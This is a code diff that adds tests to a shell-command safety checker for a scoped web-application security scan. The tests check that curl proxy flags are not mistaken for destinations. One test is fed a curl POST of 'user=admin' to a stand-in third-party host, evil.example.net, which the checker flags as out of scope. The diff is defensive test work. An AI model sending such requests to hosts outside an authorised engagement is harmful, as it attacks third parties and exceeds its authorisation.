@@ -95,3 +95,39 @@ test("a destructive target action outranks every other verdict", () => {
   );
   assert.equal(detail?.kind, "destructive_target");
 });
+
+test("a proxy flag names the fence, not a host the command connects to", () => {
+  // The scan recipe sets P="-x http://egress:3128" and curls through it. The
+  // proxy is the attack box's way out — `egress` is infrastructure, not a
+  // destination the command itself connects to — so naming it in a -x/--proxy
+  // flag must not surface an out_of_scope consent prompt.
+  const withProxy = (proxyFlag: string) =>
+    `P="${proxyFlag}"; B="http://zero.webappsecurity.com:8080"; curl -s -D - -o /dev/null --max-time 20 $P "$B/"`;
+
+  for (const flag of [
+    "-x http://egress:3128",
+    "--proxy http://egress:3128",
+    "--proxy=http://egress:3128",
+    "-x http://127.0.0.1:3128",
+  ]) {
+    assert.equal(
+      shellSafetyDetail(withProxy(flag), ctx("zero.webappsecurity.com:8080")),
+      undefined,
+      flag,
+    );
+  }
+});
+
+test("a proxy flag does not hide a real out-of-scope destination", () => {
+  const base = 'P="-x http://egress:3128"; B="http://zero.webappsecurity.com:8080"; ';
+  // The `egress` proxy flag is infrastructure, but the URL the command actually
+  // hits still has to be judged: a write through the fence to a third party is
+  // still a write to a third party, and an attack tool aimed at a third party
+  // does not become engagement activity because the request egresses through
+  // the fence.
+  const write = base + 'curl -s -X POST -d "user=admin" $P "http://evil.example.net/login"';
+  assert.equal(
+    shellSafetyDetail(write, ctx("zero.webappsecurity.com:8080"))?.kind,
+    "out_of_scope",
+  );
+});
